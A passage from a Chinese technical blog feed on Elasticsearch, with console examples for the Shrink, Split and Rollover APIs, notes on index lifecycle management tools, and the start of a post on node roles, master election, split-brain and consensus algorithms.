class="line">PUT /my_source_index/_settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.blocks.write"</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错，必须都在一个节点</span></span><br><span class="line">POST my_source_index/_shrink/my_target_index</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.number_of_replicas"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"index.number_of_shards"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"index.codec"</span>: <span class="string">"best_compression"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"aliases"</span>: &#123;</span><br><span class="line">    <span class="attr">"my_search_indices"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DELETE my_source_index</span><br><span class="line"><span class="comment">// 确保分片都在 hot</span></span><br><span class="line">PUT my_source_index</span><br><span class="line">&#123;</span><br><span class="line"> <span class="attr">"settings"</span>: &#123;</span><br><span class="line">   <span class="attr">"number_of_shards"</span>: <span class="number">4</span>,</span><br><span class="line">   <span class="attr">"number_of_replicas"</span>: <span class="number">0</span>,</span><br><span class="line">   <span class="attr">"index.routing.allocation.include.box_type"</span>:<span class="string">"hot"</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my_source_index/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"key"</span>:<span class="string">"value"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET _cat/shards/my_source_index</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为只读</span></span><br><span class="line">PUT /my_source_index/_settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.blocks.write"</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST my_source_index/_shrink/my_target_index</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.number_of_replicas"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"index.number_of_shards"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"index.codec"</span>: <span class="string">"best_compression"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"aliases"</span>: &#123;</span><br><span class="line">    <span class="attr">"my_search_indices"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET _cat/shards/my_target_index</span><br><span class="line"></span><br><span class="line"><span class="comment">// My target_index状态为也只读</span></span><br><span class="line">PUT my_target_index/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"key"</span>:<span class="string">"value"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Split-API"><a href="#Split-API" class="headerlink" title="Split API"></a>Split API</h3><ul><li>跟 Shrink API 相反</li></ul><p><img src="/images/big-data/es-07/41.jpg" alt="41"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Split Index</span></span><br><span class="line">DELETE my_source_index</span><br><span class="line">DELETE my_target_index</span><br><span class="line"></span><br><span class="line">PUT my_source_index</span><br><span class="line">&#123;</span><br><span class="line"> <span class="attr">"settings"</span>: &#123;</span><br><span class="line">   <span class="attr">"number_of_shards"</span>: <span class="number">4</span>,</span><br><span class="line">   <span class="attr">"number_of_replicas"</span>: <span class="number">0</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my_source_index/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"key"</span>:<span class="string">"value"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET _cat/shards/my_source_index</span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须是倍数</span></span><br><span class="line">POST my_source_index/_split/my_target</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.number_of_shards"</span>: <span class="number">10</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须是只读</span></span><br><span class="line">POST my_source_index/_split/my_target</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.number_of_shards"</span>: <span class="number">8</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置为只读</span></span><br><span class="line">PUT /my_source_index/_settings</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.blocks.write"</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST my_source_index/_split/my_target_index</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>: &#123;</span><br><span class="line">    <span class="attr">"index.number_of_shards"</span>: <span class="number">8</span>,</span><br><span class="line">    <span class="attr">"index.number_of_replicas"</span>:<span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET _cat/shards/my_target_index</span><br><span class="line"></span><br><span class="line"><span class="comment">// write block</span></span><br><span class="line">PUT my_target_index/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"key"</span>:<span class="string">"value"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一个时间序列索引的实际场景"><a href="#一个时间序列索引的实际场景" class="headerlink" title="一个时间序列索引的实际场景"></a>一个时间序列索引的实际场景</h3><p><img src="/images/big-data/es-07/42.jpg" alt="42"></p><ul><li>比如说在第一天写入 index0 90G，这个主分片数设置为 5，单个分片数就没有超过 20GB</li><li>第二天写入 index1 520G，出现暴增，超出了合理的值</li><li>Rotation：可以设置一个值，超过这个值就创建个新的索引写入</li></ul><h3 id="Rollover-API"><a href="#Rollover-API" class="headerlink" title="Rollover API"></a>Rollover API</h3><ul><li>当满足一系列的条件，Rollover API 支持将一个 Alias 指向一个新的索引<ul><li>存活的时间 / 最大文档数 / 最大的文件尺寸</li></ul></li><li>应用场景<ul><li>当一个索引数据量过大</li></ul></li><li>一般需要和 Index Lifecycle Management Policies 结合使用<ul><li><strong>只有调用 Rollover API 时，才会去做相应的检测</strong>。ES 并不会自动去监控这些索引</li></ul></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">DELETE nginx-logs*</span><br><span class="line"><span class="comment">// 不设定 is_write_true</span></span><br><span class="line"><span class="comment">// 名字符合命名规范</span></span><br><span class="line">PUT /nginx-logs-000001</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"aliases"</span>: &#123;</span><br><span class="line">    <span class="attr">"nginx_logs_write"</span>: &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多次写入文档</span></span><br><span class="line">POST nginx_logs_write/_doc</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"log"</span>:<span class="string">"something"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST /nginx_logs_write/_rollover</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"conditions"</span>: &#123;</span><br><span class="line">    <span class="attr">"max_age"</span>: <span class="string">"1d"</span>,</span><br><span class="line">    <span class="attr">"max_docs"</span>:  <span class="number">5</span>,</span><br><span class="line">    <span class="attr">"max_size"</span>: <span class="string">"5gb"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET /nginx_logs_write/_count</span><br><span class="line"><span class="comment">// 查看 Alias信息</span></span><br><span class="line">GET /nginx_logs_write</span><br><span class="line"></span><br><span class="line">DELETE apache-logs*</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 is_write_index</span></span><br><span class="line">PUT apache-logs1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"aliases"</span>: &#123;</span><br><span class="line">    <span class="attr">"apache_logs"</span>: &#123;</span><br><span class="line">      <span class="attr">"is_write_index"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST apache_logs/_count</span><br><span class="line"></span><br><span class="line">POST apache_logs/_doc</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"key"</span>:<span class="string">"value"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要指定 target 的名字</span></span><br><span class="line">POST /apache_logs/_rollover/apache-logs8xxxx</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"conditions"</span>: &#123;</span><br><span class="line">    <span class="attr">"max_age"</span>:   <span class="string">"1d"</span>,</span><br><span class="line">    <span class="attr">"max_docs"</span>:  <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"max_size"</span>:  <span class="string">"5gb"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看 Alias信息</span></span><br><span class="line">GET /apache_logs</span><br></pre></td></tr></table></figure><h2 id="索引全生命周期管理及工具介绍"><a href="#索引全生命周期管理及工具介绍" class="headerlink" title="索引全生命周期管理及工具介绍"></a>索引全生命周期管理及工具介绍</h2><h3 id="时间序列的索引"><a href="#时间序列的索引" class="headerlink" title="时间序列的索引"></a>时间序列的索引</h3><ul><li>特点<ul><li>索引中的数据随着时间，持续不断增长</li></ul></li><li>按照时间序列划分索引的好处 &amp; 挑战<ul><li>按照时间进行划分索引，会使得管理更加简单。例如，完整删除一个索引，性能比 delete by query 好</li><li>如何进行自动化管理，减少人工操作<ul><li>从 Hot 移动到 Warm</li><li>定期关闭或者删除索引</li></ul></li></ul></li></ul><h3 id="索引生命周期常见的阶段"><a href="#索引生命周期常见的阶段" class="headerlink" title="索引生命周期常见的阶段"></a>索引生命周期常见的阶段</h3><p><img src="/images/big-data/es-07/43.jpg" alt="43"></p><ul><li>Hot∶ 索引还存在着大量的读写操作</li><li>Warm∶ 索引不存在写操作，还有被查询的需要</li><li>Cold∶ 数据不存在写操作，读操作也不多</li><li>Delete∶ 索引不再需要，可以被安全删除</li></ul><h3 id="Elasticsearch-Curator"><a href="#Elasticsearch-Curator" class="headerlink" title="Elasticsearch Curator"></a>Elasticsearch Curator</h3><ul><li>Elastic 官方推出的工具<ul><li>基于 python 的命令行工具</li></ul></li><li>配置 Actions<ul><li>内置 10 多种 Index 相关的操作</li><li>每个动作可以顺序执行</li></ul></li><li>Filters<ul><li>支持各种条件，过滤出需要操作的索引</li></ul></li></ul><p><img src="/images/big-data/es-07/44.jpg" alt="44"></p><blockquote><p><a href="https://www.elastic.co/guide/en/elasticsearch/client/curator/current/index.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/client/curator/current/index.html</a></p></blockquote><h3 id="eBay-Lifecycle-Management-Tool"><a href="#eBay-Lifecycle-Management-Tool" class="headerlink" title="eBay Lifecycle Management Tool"></a>eBay Lifecycle Management Tool</h3><ul><li>eBay Pronto team 自研图形化工具<ul><li>支持 Curator 的功能</li><li>一个界面，管理多个 ES 集群</li><li>支持不同的 ES 版本</li></ul></li><li>支持图形化配置</li><li>Job 定时触发</li><li>系统高可用</li></ul><h3 id="工具比较"><a href="#工具比较" class="headerlink" title="工具比较"></a>工具比较</h3><table><thead><tr><th align="left">Function</th><th align="left">Gurator</th><th align="left">_rollover</th><th align="left">Index Managemen Service</th></tr></thead><tbody><tr><td align="left">index Action</td><td align="left">All supported</td><td align="left">Create, <br/> Alias rotation</td><td align="left">Create, <br/> Close, <br/> Delete, <br/> Index settings, <br/> Alias rotation</td></tr><tr><td align="left">Version Compatbility <br/> On ES 2.x 5.x 6.x</td><td align="left">Not fully covered</td><td align="left">Not fully covered</td><td align="left">All covered</td></tr><tr><td align="left">Job Scheduling</td><td align="left">No</td><td align="left">No</td><td align="left">Yes</td></tr><tr><td align="left">Web Portal</td><td align="left">No</td><td align="left">No</td><td align="left">Yes</td></tr><tr><td align="left">High Availability</td><td align="left">No</td><td align="left">No</td><td align="left">Yes</td></tr><tr><td align="left">Multi-cluster Support</td><td align="left">No</td><td align="left">No</td><td align="left">Yes</td></tr></tbody></table><blockquote><p>eBay(Index Managemen Service) 不开源，再好也用不上……</p></blockquote><h3 id="Index-Lifecycle-Management"><a href="#Index-Lifecycle-Management" class="headerlink" title="Index Lifecycle Management"></a>Index Lifecycle Management</h3><ul><li>Elasticsearch 6.6 推出的新功能<ul><li>基于 X-Pack Basic License，可免费使用</li></ul></li><li>ILM 概念<ul><li>Policy</li><li>Phase</li><li>Action</li></ul></li></ul><h3 id="ILM-Policy"><a href="#ILM-Policy" class="headerlink" title="ILM Policy"></a>ILM Policy</h3><p><img src="/images/big-data/es-07/45.jpg" alt="45"></p><ul><li>集群中支持定义多个 Policy</li><li>每个索引可以使用相同或不相同的 Policy</li></ul><h3 id="Index-Lifecycle-Policies-图形化界面"><a href="#Index-Lifecycle-Policies-图形化界面" class="headerlink" title="Index Lifecycle Policies 图形化界面"></a>Index Lifecycle Policies 图形化界面</h3><ul><li>通过 Kibana Management 设定</li><li>Hot phase 是必须要的<ul><li>可以 enable rollover</li></ul></li><li>其他 Phase 按需设失</li><li>Watch-history-ilm policy<ul><li>创建 7 天后自动删除</li></ul></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《Elasticsearch核心技术与实战》</li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/configuring-security.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/configuring-security.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/configuring-tls.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/configuring-tls.html</a></li><li><a href="https://www.elastic.co/cn/blog/sizing-hot-warm-architectures-for-logging-and-metrics-in-the-elasticsearch-service-on-elastic-cloud" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/sizing-hot-warm-architectures-for-logging-and-metrics-in-the-elasticsearch-service-on-elastic-cloud</a></li><li><a href="https://www.elastic.co/cn/blog/deploying-a-hot-warm-logging-cluster-on-the-elasticsearch-service" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/deploying-a-hot-warm-logging-cluster-on-the-elasticsearch-service</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/cluster-reroute.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/cluster-reroute.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/indices-forcemerge.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/indices-forcemerge.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/allocation-total-shards.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/allocation-total-shards.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/guide/current/capacity-planning.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/guide/current/capacity-planning.html</a></li><li><a href="https://yq.aliyun.com/articles/670118" target="_blank" rel="noopener">https://yq.aliyun.com/articles/670118</a></li><li><a href="https://www.elastic.co/cn/blog/introducing-elastic-cloud-on-kubernetes-the-elasticsearch-operator-and-beyond?elektra=products&amp;storm=sub1" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/introducing-elastic-cloud-on-kubernetes-the-elasticsearch-operator-and-beyond?elektra=products&amp;storm=sub1</a></li><li><a href="https://www.elastic.co/blog/introducing-elastic-cloud-on-kubernetes-the-elasticsearch-operator-and-beyond" target="_blank" rel="noopener">https://www.elastic.co/blog/introducing-elastic-cloud-on-kubernetes-the-elasticsearch-operator-and-beyond</a></li><li><a href="https://github.com/operator-framework" target="_blank" rel="noopener">https://github.com/operator-framework</a></li><li><a href="https://github.com/upmc-enterprises/elasticsearch-operator" target="_blank" rel="noopener">https://github.com/upmc-enterprises/elasticsearch-operator</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/tune-for-indexing-speed.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/tune-for-indexing-speed.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/tune-for-search-speed.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/tune-for-search-speed.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/indices-shrink-index.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/indices-shrink-index.html</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.1/indices-rollover-index.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.1/indices-rollover-index.html</a></li></ul><style>  img {    zoom: 80%;  }</style>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;深入了解 ES 集群管理、生产环境建议等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="BigData" scheme="https://xinlichao.cn/categories/BigData/"/>
    
    
      <category term="Elastic Stack" scheme="https://xinlichao.cn/tags/Elastic-Stack/"/>
    
      <category term="ES" scheme="https://xinlichao.cn/tags/ES/"/>
    
  </entry>
  
  <entry>
    <title>重学 Elastic Stack 之 Elasticsearch 深入了解(二)</title>
    <link href="https://xinlichao.cn/back-end/big-data/es-06/"/>
    <id>https://xinlichao.cn/back-end/big-data/es-06/</id>
    <published>2021-02-08T22:10:00.000Z</published>
    <updated>2021-02-26T10:23:44.670Z</updated>
    
    <content type="html"><![CDATA[<p>深入了解 ES 集群、分页、聚合分析、父子文档、数据建模等。</p><a id="more"></a><h2 id="集群分布式模型与选主与脑裂问题"><a href="#集群分布式模型与选主与脑裂问题" class="headerlink" title="集群分布式模型与选主与脑裂问题"></a>集群分布式模型与选主与脑裂问题</h2><h3 id="分布式特性"><a href="#分布式特性" class="headerlink" title="分布式特性"></a>分布式特性</h3><ul><li>ES 的分布式架构带来的好处<ul><li>储存的水平扩容，支持 PB 级数据</li><li>提高系统的可用性，部分节点停止服务，整个集群的服务不受影响</li></ul></li><li>ES 的分布式架构<ul><li>不同的集群通过不同的名字来区分，默认名字 “elasticsearch”</li><li>通过配置文件的修改，或者在命令行中 <code>-E cluster.name=xxx</code> 设定</li></ul></li></ul><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><ul><li>节点是一个 ES 的实例<ul><li>其本质就是一个 JAVA 进程</li><li>一台机器可以运行多个 ES 进程，但是生产环境一般建议一台机器就运行一个 ES 实例</li></ul></li><li>每一个节点都有名字，通过配置文件配置，或者启动时候 <code>-E node.name=xxx</code> 指定</li><li>每一个节点在启动之后，都会分配一个 UID，保存在 data 目录下</li></ul><h3 id="Coordinating-Node"><a href="#Coordinating-Node" class="headerlink" title="Coordinating Node"></a>Coordinating Node</h3><ul><li>处理请求的节点，叫 Coordinating Node<ul><li>路由请求到正确的节点，例如创建索引的请求，需要路由到 Master 节点</li></ul></li><li>所有节点默认都是 Coordinating Node</li><li>通过将其他类型设置成 False ，使其成为 Dedicated Coordinating Node</li></ul><h3 id="Data-Node"><a href="#Data-Node" class="headerlink" title="Data Node"></a>Data Node</h3><ul><li>可以保存数据的节点，叫做 Data Node<ul><li>节点启动后，默认就是数据节点。可以设置 <code>node.data:false</code> 禁止</li></ul></li><li>Data Node 的职责<ul><li>保存分片数据。在数据扩展上起到了至关重要的作用（由 Master Node 决定把分片分发到数据节点上）</li></ul></li><li>通过增加数据节点<ul><li>可以解决数据<strong>水平扩展</strong>和解决<strong>数据单点</strong>的问题</li></ul></li></ul><h3 id="Master-Node"><a href="#Master-Node" class="headerlink" title="Master Node"></a>Master Node</h3><ul><li>Master Node 的职责<ul><li>处理创建，删除索引等请求 / 决定分片被分配到哪个节点 / 负责索引的创建与删除</li><li>维护并且更新 Cluster State</li></ul></li><li>Master Node 的最佳实践<ul><li>Master 节点非常重要，在部署上需要考虑解决单点的问题</li><li>为一个集群设置多个 Master 节点 / 每个节点值承担 Master 的单一角色</li></ul></li></ul><h3 id="Master-Eligible-Nodes-amp-选主流程"><a href="#Master-Eligible-Nodes-amp-选主流程" class="headerlink" title="Master Eligible Nodes &amp; 选主流程"></a>Master Eligible Nodes &amp; 选主流程</h3><ul><li>一个集群，支持配置多个 Master Eligble 节点。这些节点可以在必要时（如 Master 节点出现故障，网络故障时）参与选主流程，成为 Master 节点</li><li>每个节点启动后，默认就是一个 Master eligible 节点<ul><li>可以设置 <code>node.master:false</code></li></ul></li><li>当集群内的第一个 Master eligible 节点启动的时候，它会将自己选举成 Master 节点</li></ul><h3 id="集群状态"><a href="#集群状态" class="headerlink" title="集群状态"></a>集群状态</h3><ul><li>集群状态信息（Cluster State），维护了一个集群中，必要的信息<ul><li>所有的节点信息</li><li>所有的索引和其相关的 Mapping 与 Setting 信息</li><li>分片的路由信息</li></ul></li><li>在每个节点都保存了集群的状态信息</li><li>但是，只有 Master 节点才能修改集群的状态信息，并负责同步给其他节点<ul><li>因为，任意节点都能修改信息会导致 Cluster State 信息不一致</li></ul></li></ul><h3 id="Master-Eligbile-Nodes-amp-选主的过程"><a href="#Master-Eligbile-Nodes-amp-选主的过程" class="headerlink" title="Master Eligbile Nodes &amp; 选主的过程"></a>Master Eligbile Nodes &amp; 选主的过程</h3><ul><li>互相 ping 对方。<strong>Node Id</strong> 低的会被成为被选举的节点</li><li>其他节点会加入集群，但是不承担 Master 节点的角色。一旦发现被选中的主节点丢失，就会选举出新的 Master 节点</li></ul><p><img src="/images/big-data/es-06/1.jpg" alt="1"></p><h3 id="脑裂问题"><a href="#脑裂问题" class="headerlink" title="脑裂问题"></a>脑裂问题</h3><ul><li>Split-Brain ，分布式系统的经典网络问题，当出现网络问题，一个节点和其他节点无法连接<ul><li>Node 2 和 Node 3 会被重新选举 Master</li><li>Node 1 自己还是作为 Master，组成一个集群，同时更新 Cluster State</li><li>导致 2 个 master，维护不同的 cluster state。当网络恢复是，无法选择正确恢复</li></ul></li></ul><p><img src="/images/big-data/es-06/2.jpg" alt="2"></p><h3 id="如何避免脑裂问题"><a href="#如何避免脑裂问题" class="headerlink" title="如何避免脑裂问题"></a>如何避免脑裂问题</h3><ul><li>限定一个选举条件，这是 quorum（仲裁），只有在 Master eligble 节点数大于 quorum 时，才能进行选举<ul><li>Quorum = (master 节点总数 / 2) + 1</li><li>当 3 个 master eligible 时，设置 <strong>discovery.zen.minimum_master_nodes</strong> 为 2 ，即可避免脑裂</li></ul></li><li>从 7.0 开始，无需这个配置<ul><li>移除 minimum_master_nodes 参数，让 ES 自己选择可以形成冲裁的节点</li><li>典型的主节点选举现在只需要很短的时间可以完成。集群的伸缩变得更加安全，更容易，并且可能造成丢失数据的系统配置选项更少了</li><li>节点更清楚的记录它们的状态，有助于诊断为什么它们不能加入集群或为什么无法选举除主节点</li></ul></li></ul><h3 id="为什么高可用是奇数节点？"><a href="#为什么高可用是奇数节点？" class="headerlink" title="为什么高可用是奇数节点？"></a>为什么高可用是奇数节点？</h3><p>为了避免脑裂，同时也为了避免浪费资源（机器），Raft 算法为：</p><p>N 为 master 节点总数，可容忍 <strong>(N-1)/2</strong> 失败数，quorum 需要 <strong>(N/2)+1</strong></p><h3 id="分布式共识算法"><a href="#分布式共识算法" class="headerlink" title="分布式共识算法"></a>分布式共识算法</h3><p>一致性往往指分布式系统中多个副本对外呈现的数据的状态。共识则描述了分布式系统中多个节点之间，彼此对某个状态达成一致结果的过程。因此，一致性描述的是结果状态，共识则是一种手段。达成某种共识并不意味着就保障了一致性。</p><p>对于分布式系统来讲，各个节点通常都是相同的确定性状态机模型（又称为状态机复制问题，state-machine replication），从相同初始状态开始接收相同顺序的指令，则可以保证相同的结果状态。因此，系统中多个节点最关键的是对多个事件的顺序进行共识，即排序。</p><p><strong>问题与挑战</strong></p><p>一般地，把出现故障（crash或fail-stop，即不响应）但不会伪造信息的情况称为“非拜占庭错误”（non-byzantine fault）或“故障错误”（Crash Fault）；伪造信息恶意响应的情况称为“拜占庭错误”（Byzantine Fault），对应节点为拜占庭节点。</p><p><strong>常见算法</strong></p><p>根据解决的是非拜占庭的普通错误情况还是拜占庭错误情况，共识算法可以分为Crash Fault Tolerance（CFT）类算法和Byzantine Fault Tolerance（BFT）类算法。</p><p>对于非拜占庭错误：已经存在一些经典的解决算法，包括Paxos、Raft及其变种等。这类容错算法往往性能比较好，处理较快，容忍不超过一半的故障节点。</p><p>对于拜占庭错误：一般包括PBFT（Practical Byzantine Fault Tolerance）为代表的确定性系列算法、PoW为代表的概率算法等。对于确定性算法，一旦达成对某个结果的共识就不可逆转，即共识是最终结果；而对于概率类算法，共识结果则是临时的，随着时间推移或某种强化，共识结果被推翻的概率越来越小，成为事实上的最终结果。拜占庭类容错算法往往性能较差，容忍不超过1/3的故障节点。</p><p>此外，XFT（Cross Fault Tolerance）等改进算法可以提供类似CFT的处理响应速度，并能在大多数节点正常工作时提供BFT保障。</p><p>crash fault tolerance 的系统，节点数需要满足 n=2f+1 （ f 为会崩溃的节点数），所以最小的系统需要 3 个节点。</p><p>拜占庭容错系统的节点数是 n=3f+1 （ f 为拜占庭节点数量）。所以拜占庭容错系统需要至少 4 个节点才能容忍 1 个拜占庭节点。</p><p>相关的理论可以看 Paxos，Raft，pbft 等著名论文。主要思想是：保证正常运作的节点数量过系统的半数（过半机制）。</p><ul><li><a href="https://www.the-paper-trail.org/post/2008-08-13-a-brief-tour-of-flp-impossibility/" target="_blank" rel="noopener">FLP 不可能定理</a></li><li><a href="https://www.usenix.org/system/files/conference/atc14/atc14-paper-ongaro.pdf" target="_blank" rel="noopener">Raft 共识算法论文</a></li></ul><h3 id="配置节点类型"><a href="#配置节点类型" class="headerlink" title="配置节点类型"></a>配置节点类型</h3><ul><li>一个节点默认下是一个 Master eligible ，data and ingest node</li></ul><table><thead><tr><th align="left">节点类型</th><th align="left">配置参数</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left">maste eligible</td><td align="left">node.master</td><td align="left">true</td></tr><tr><td align="left">data</td><td align="left">node.data</td><td align="left">true</td></tr><tr><td align="left">ingest</td><td align="left">node.ingest</td><td align="left">ture</td></tr><tr><td align="left">coordinating only</td><td align="left">⽆</td><td align="left">设置上⾯三个参数全部为 false</td></tr><tr><td align="left">machine learning</td><td align="left">node.ml</td><td align="left">true (需要 enable x-pack)</td></tr></tbody></table><blockquote><p>配置版本基于 7.1，相关配置可能已发生改动详情看 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/modules-node.html" target="_blank" 